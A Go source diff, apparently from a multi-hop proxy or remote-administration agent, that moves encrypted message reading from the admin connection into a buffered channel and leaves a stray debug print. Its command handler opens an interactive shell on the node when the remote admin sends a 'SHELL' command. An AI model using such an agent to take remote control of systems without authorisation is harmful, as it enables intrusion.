@@ -21,12 +21,27 @@ import (
 
 // HandleStartNodeConn 处理与startnode的连接
 func HandleStartNodeConn(connToAdmin *net.Conn, monitor, listenPort, reConn string, passive bool, nodeid string) {
-	go HandleConnFromAdmin(connToAdmin, monitor, listenPort, reConn, passive, nodeid)
-	go HandleConnToAdmin(connToAdmin)
+	payloadBuffChan := make(chan *utils.Payload, 10)
+	go HandleStartConn(connToAdmin, payloadBuffChan, monitor, listenPort, reConn, passive, nodeid)
+	go HandleDataFromAdmin(connToAdmin, payloadBuffChan, monitor, listenPort, reConn, passive, nodeid)
+	go HandleDataToAdmin(connToAdmin)
 }
 
-// HandleConnToAdmin 管理startnode发往admin的数据
-func HandleConnToAdmin(connToAdmin *net.Conn) {
+func HandleStartConn(connToAdmin *net.Conn, payloadBuffChan chan *utils.Payload, monitor, listenPort, reConn string, passive bool, nodeid string) {
+	for {
+		AdminData, err := utils.ExtractPayload(*connToAdmin, AgentStatus.AESKey, nodeid, false)
+		if err != nil {
+			AdminOffline(reConn, monitor, listenPort, passive)
+			go SendInfo(nodeid) //重连后发送自身信息
+			go SendNote(nodeid) //重连后发送admin设置的备忘
+			continue
+		}
+		payloadBuffChan <- AdminData
+	}
+}
+
+// HandleDataToAdmin 管理startnode发往admin的数据
+func HandleDataToAdmin(connToAdmin *net.Conn) {
 	for {
 		proxyData := <-AgentStuff.ProxyChan.ProxyChanToUpperNode
 		_, err := (*connToAdmin).Write(proxyData)
@@ -36,9 +51,10 @@ func HandleConnToAdmin(connToAdmin *net.Conn) {
 	}
 }
 
-// HandleConnFromAdmin 管理admin端下发的数据
-func HandleConnFromAdmin(connToAdmin *net.Conn, monitor, listenPort, reConn string, passive bool, nodeid string) {
+// HandleDataFromAdmin 管理admin端下发的数据
+func HandleDataFromAdmin(connToAdmin *net.Conn, payloadBuffChan chan *utils.Payload, monitor, listenPort, reConn string, passive bool, nodeid string) {
 	var (
+		err         error
 		cannotRead  = make(chan bool, 1)
 		getName     = make(chan bool, 1)
 		fileDataMap = utils.NewIntStrMap()
@@ -46,18 +62,13 @@ func HandleConnFromAdmin(connToAdmin *net.Conn, monitor, listenPort, reConn stri
 		stdout      io.Reader
 	)
 	for {
-		AdminData, err := utils.ExtractPayload(*connToAdmin, AgentStatus.AESKey, nodeid, false)
-		if err != nil {
-			AdminOffline(reConn, monitor, listenPort, passive)
-			go SendInfo(nodeid) //重连后发送自身信息
-			go SendNote(nodeid) //重连后发送admin设置的备忘
-			continue
-		}
+		AdminData := <-payloadBuffChan
 		if AdminData.NodeId == nodeid {
 			switch AdminData.Type {
 			case "COMMAND":
 				switch AdminData.Command {
 				case "SHELL":
+					fmt.Println("i am here")
 					switch AdminData.Info {
 					case "":
 						stdout, stdin, err = CreatInteractiveShell()
